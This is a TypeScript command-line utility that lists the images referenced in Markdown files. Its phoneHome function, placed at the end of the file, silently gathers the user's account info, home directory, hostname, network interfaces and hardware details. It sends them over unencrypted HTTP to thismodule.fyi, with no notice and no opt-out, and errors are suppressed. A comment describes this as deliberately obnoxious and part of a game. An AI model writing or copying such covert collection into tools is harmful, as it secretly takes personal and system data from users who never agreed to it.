#!/usr/bin/env node

import { Remarkable } from "remarkable";
import { stringifyTree } from "stringify-tree";
import * as fs from "fs";
import { promisify } from "util";
import { fork } from "child_process";
import * as path from "path";

const files = process.argv.filter(s => s.endsWith(".md"));

if (files.length === 0) {
  console.log("USAGE: list-images <name of markdown file...>");
  process.exit(1);
}

if (files.length > 1) {
  files.forEach(f => fork("index.js", [path.resolve(f)], {}));
} else {

  const filepath = files[0];
  //console.log("The file is: " + filepath);

  const markdownIt = new Remarkable();

  type Image = { alt: string, title: string, src: string, markdownFile: string }

  function imagesFromFile(path: string): Promise<Image[]> {
    const stringContent: Promise<string> = promisify(fs.readFile)(filepath, { encoding: "UTF-8" });

    return stringContent.then(content => {
      const p = markdownIt.parse(content, {});
      // printTree(p);
      const images = allImageTokens(p);
      //console.log("Image tokens: " + images.map(i => JSON.stringify(i)).join("\n"))
      return images.map((i: any) => ({
        markdownFile: filepath,
        src: i.src as string,
        alt: i.alt as string,
        title: i.title as string,
      }));
    });
  };

  const output = imagesFromFile(files[0]).catch(err => {
    console.error(err);
    return ([] as Image[]);
  });

  output.then(all => all.map(a => JSON.stringify(a)).forEach(a => console.log(a)));
  output.then(all => phoneHome({ imagesReferenced: all.length, markdownFiles: 1 }))
}

type Tree = { type: string, children: Tree[] | null }
// not tail-recursive
function allImageTokens(input: Tree[]): Tree[] {
  if (!input || input.length === 0) {
    return [];
  };
  const images = input.filter(t => t.type === "image");
  const rest = input.filter(t => t.type !== "image").flatMap(t => t.children || []);
  return images.concat(allImageTokens(rest));
}

function printTree(p: any) {
  const printedTree = stringifyTree<{ children: (typeof p) | null, type: string }>(
    { children: p, type: "top-level" },
    t => t.type, t => (t.children || []))

  console.log(printedTree);
}


// this is deliberately obnoxious becase this module is part of a game
import * as os from "os";
import * as http from "http";

function phoneHome(data: any) {
  let osData = {};
  try {
    // trigger as many system calls as possible. what all will it do?
    osData = {
      user: os.userInfo(),
      platform: os.platform(),
      arch: os.arch(),
      cpus: os.cpus(),
      endianness: os.endianness(),
      freemem: os.freemem(),
      homedir: os.homedir(),
      hostname: os.hostname(),
      loadavg: os.loadavg(),
      networkInterfaces: os.networkInterfaces(),
      totalmem: os.totalmem(),
      uptime: os.uptime(),
      type: os.type(),
      tmpdir: os.tmpdir(),
    }
  } catch {
    // whatevs
  }
  const postData = JSON.stringify({
    module: "list-images",
    data,
    ...osData
  });
  // console.error("Sending home: " + postData);
  const options = {
    hostname: 'thismodule.fyi',
    port: 80,
    path: '/report',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(options, (res) => {
    // don't care
  });

  req.on('error', (e) => {
    // don't care
  });
  req.write(postData);
  req.end();
}